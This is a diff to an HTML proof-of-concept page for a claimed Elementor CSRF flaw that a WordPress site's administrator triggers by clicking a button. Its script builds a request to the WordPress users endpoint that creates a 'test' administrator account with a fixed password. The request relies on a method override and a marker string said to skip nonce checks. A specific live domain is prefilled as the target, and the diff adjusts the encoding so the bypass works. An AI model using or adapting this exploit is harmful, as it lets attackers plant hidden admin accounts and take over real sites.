@@ -6,50 +6,43 @@
 <title>Elementor CSRF PoC — CVE-2026-62062</title>
 <style>
   body{font-family:system-ui,sans-serif;max-width:760px;margin:40px auto;padding:0 16px;line-height:1.5}
-  code,input,textarea{font-family:ui-monospace,monospace}
+  input,textarea,code{font-family:ui-monospace,monospace}
   input,textarea{width:100%;box-sizing:border-box;padding:8px;margin:4px 0 16px}
   a.btn{display:inline-block;padding:12px 20px;font-size:16px;color:#fff;background:#b3261e;
         text-decoration:none;border-radius:6px}
   .note{background:#fff4e5;border-left:4px solid #f0a000;padding:10px 14px;border-radius:4px}
-  pre{background:#f4f4f4;padding:12px;border-radius:6px;overflow:auto}
 </style>
 </head>
 <body>
   <h1>Elementor 4.3.0/4.3.1 — CSRF → Admin</h1>
-
   <p class="note">Victim must be logged in as admin on the target <strong>in this same browser</strong> before clicking.</p>
 
-  <p>Target base URL (edit me):</p>
+  <p>Target base URL:</p>
   <input id="target" value="https://mrgm.co.ke">
 
-  <p>Payload URL:</p>
+  <p>Payload URL (note the LITERAL slashes in the marker):</p>
   <textarea id="payload" rows="4" readonly></textarea>
 
-  <p>Then click:</p>
   <a id="fire" class="btn" href="#">Create "test" admin</a>
 
-  <p style="margin-top:28px">Result of the response (if same-origin/CORS allows; otherwise the JSON is just shown in the tab):</p>
-  <pre id="out">—</pre>
-
   <script>
+    // Build manually so the marker keeps literal '/' — do NOT use URLSearchParams here,
+    // it serializes '/' as %2F and REQUEST_URI then no longer contains the substring.
     function build() {
       const base = document.getElementById('target').value.replace(/\/+$/, '');
-      const u = new URL(base + '/wp-json/wp/v2/users');
-      u.searchParams.set('_method', 'POST');            // WP verb override -> a GET nav performs a write
-      u.searchParams.set('username', 'test');
-      u.searchParams.set('email', 'test@example.test');
-      u.searchParams.set('password', 'Mike@17894');
-      u.searchParams.append('roles[]', 'administrator');
-      u.searchParams.set('x', 'elementor/v1/events/');  // pre-fix: substring ANYWHERE in raw URI bypasses nonce
-      return u.toString();
+      return base + '/wp-json/wp/v2/users'
+        + '?_method=POST'
+        + '&username=test'
+        + '&email=test%40example.test'
+        + '&password=Mike%4017894'
+        + '&roles%5B%5D=administrator'
+        + '&x=elementor/v1/events/';           // literal slashes — required
     }
-
     function render() {
       const url = build();
       document.getElementById('payload').value = url;
       document.getElementById('fire').href = url;
     }
-
     document.getElementById('target').addEventListener('input', render);
     render();
   </script>
